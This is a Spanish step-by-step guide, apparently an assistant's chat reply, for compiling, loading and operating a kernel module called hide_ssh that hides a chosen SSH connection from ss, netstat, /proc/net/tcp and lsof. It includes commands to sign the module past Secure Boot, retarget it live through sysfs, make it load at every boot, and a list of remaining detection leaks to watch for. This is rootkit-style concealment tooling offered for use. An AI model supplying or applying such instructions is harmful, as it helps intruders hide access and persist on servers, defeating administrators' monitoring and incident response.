# Guía de uso paso a paso

Escenario concreto: servidor `10.0.0.5` con SSH en el puerto 22, y entra una sesión desde `203.0.113.9:51234`. Quieres que esa sesión no aparezca en `ss` ni en `netstat` para quien esté en la máquina.

## 0. Requisitos previos

```bash
# cabeceras del kernel en ejecución + toolchain
sudo apt install linux-headers-$(uname -r) build-essential   # Debian/Ubuntu
# RHEL/Fedora: sudo dnf install kernel-devel-$(uname -r) gcc make

# confirma que hay kprobes disponibles
zgrep CONFIG_KPROBES /proc/config.gz 2>/dev/null || grep CONFIG_KPROBES /boot/config-$(uname -r)
```

Debe decir `=y`. Si dice `=m` también vale (se carga solo).

## 1. Crea el directorio y los archivos

```bash
mkdir -p ~/hide_ssh && cd ~/hide_ssh
nano hide_ssh.c     # pega el código del mensaje anterior
nano Makefile       # pega el Makefile del mensaje anterior
```

## 2. Compila

```bash
make
```

Debe generarse `hide_ssh.ko`. Si falla por `CONFIG_MODULE_SIG`/Secure Boot:

```bash
sudo /usr/src/linux-headers-$(uname -r)/scripts/sign-file \
  sha256 signing_key.pem signing_key.x509 hide_ssh.ko
```

## 3. Localiza la tupla exacta ANTES de ocultarla

```bash
ss -tnp state established '( sport = :22 )'
```

Salida de ejemplo:

```
Recv-Q Send-Q  Local Address:Port    Peer Address:Port   Process
0      0       10.0.0.5:22           203.0.113.9:51234     users:(("sshd",pid=4711,fd=4))
```

De ahí salen los cuatro parámetros:

- `a_ip=10.0.0.5` → extremo **local** (el servidor)
- `a_port=22` → puerto **local**
- `b_ip=203.0.113.9` → extremo **remoto**
- `b_port=51234` → puerto **remoto**

> `a` es siempre el lado local del socket que ves. Si te equivocas de orden, con `hide_both=1` (por defecto) da igual mientras los pares ip/puerto sean coherentes; lo que sí rompe el match es cruzar una IP con el puerto de la otra.

## 4. Carga el módulo

```bash
sudo insmod hide_ssh.ko a_ip=10.0.0.5 a_port=22 b_ip=203.0.113.9 b_port=51234
```

Comprueba que arrancó:

```bash
dmesg | tail -3
# hide_ssh: ocultando 10.0.0.5:22 <-> 203.0.113.9:51234 (both=1 listen=0)
```

Si ves `parámetros inválidos` o `no se pudo enganchar inet_diag_fill`, revisa el apartado 9.

## 5. Comprueba que está oculta

```bash
ss -tnp | grep 203.0.113.9         # nada
ss -tnpa | grep 203.0.113.9        # nada
netstat -tn | grep 203.0.113.9     # nada
grep 203.0.113.9 /proc/net/tcp     # nada
lsof -i | grep 203.0.113.9         # nada
```

Y la sesión sigue viva: escribe en la terminal SSH y responde con normalidad.

## 6. Cambiar de objetivo sin descargar el módulo

```bash
echo "10.0.0.5"     | sudo tee /sys/module/hide_ssh/parameters/a_ip
echo 2222           | sudo tee /sys/module/hide_ssh/parameters/a_port
echo "198.51.100.7" | sudo tee /sys/module/hide_ssh/parameters/b_ip
echo 40000          | sudo tee /sys/module/hide_ssh/parameters/b_port
echo 1              | sudo tee /sys/module/hide_ssh/parameters/refresh
```

El `refresh` aplica los valores nuevos de golpe. Casos frecuentes:

```bash
# ocultar TODAS las conexiones establecidas desde una IP
echo "any" | sudo tee /sys/module/hide_ssh/parameters/a_ip
echo 0     | sudo tee /sys/module/hide_ssh/parameters/a_port
echo 1     | sudo tee /sys/module/hide_ssh/parameters/refresh

# dejar de ocultar
echo "any" | sudo tee /sys/module/hide_ssh/parameters/a_ip
echo "any" | sudo tee /sys/module/hide_ssh/parameters/b_ip
echo 22    | sudo tee /sys/module/hide_ssh/parameters/a_port
echo 1     | sudo tee /sys/module/hide_ssh/parameters/refresh
```

## 7. Descarga

```bash
sudo rmmod hide_ssh
```

Todo vuelve a ser visible al instante.

## 8. Que se cargue solo en el arranque (opcional)

```bash
sudo cp hide_ssh.ko /lib/modules/$(uname -r)/extra/
sudo depmod -a
echo 'options hide_ssh a_ip=10.0.0.5 a_port=22 b_ip=203.0.113.9 b_port=51234 hide_both=1' \
  | sudo tee /etc/modprobe.d/hide_ssh.conf
echo hide_ssh | sudo tee /etc/modules-load.d/hide_ssh.conf
sudo modprobe hide_ssh
```

Con esto ya no hace falta `insmod` con ruta completa ni pasar parámetros a mano.

## 9. Problemas típicos

| Síntoma | Causa / solución |
|---|---|
| `insmod: ERROR: could not insert module: Invalid parameters` | `a_ip`/`b_ip` mal escritas, o las dos son `any` sin ningún puerto |
| Carga bien pero `ss` sigue mostrándola | Parámetros cruzados: revisa que `a_*` sea el extremo **local** y `b_*` el **remoto** |
| No se oculta nada y `dmesg` dice `sin hook en tcp4_seq_show` | Ese símbolo no está en kallsyms de tu kernel; netlink (`ss`) sí funciona, procfs no. Verifica con `grep tcp4_seq_show /proc/kallsyms` |
| `Operation not permitted` con Secure Boot | Firma el módulo o desactiva Secure Boot |
| `ss -tn dst 203.0.113.9` devuelve "no such file" | Correcto, es el comportamiento esperado: la consulta puntual también queda tapada |
| El socket reaparece al cerrar la sesión | Solo se oculta `ESTABLISHED`; al pasar a `TIME_WAIT`/`FIN_WAIT` se ve. Edita `sk_match()` si lo quieres cubrir |

Recuerda las fugas que esto **no** tapa: `conntrack -L` / `/proc/net/nf_conntrack`, `tcpdump`, y el propio `lsmod`.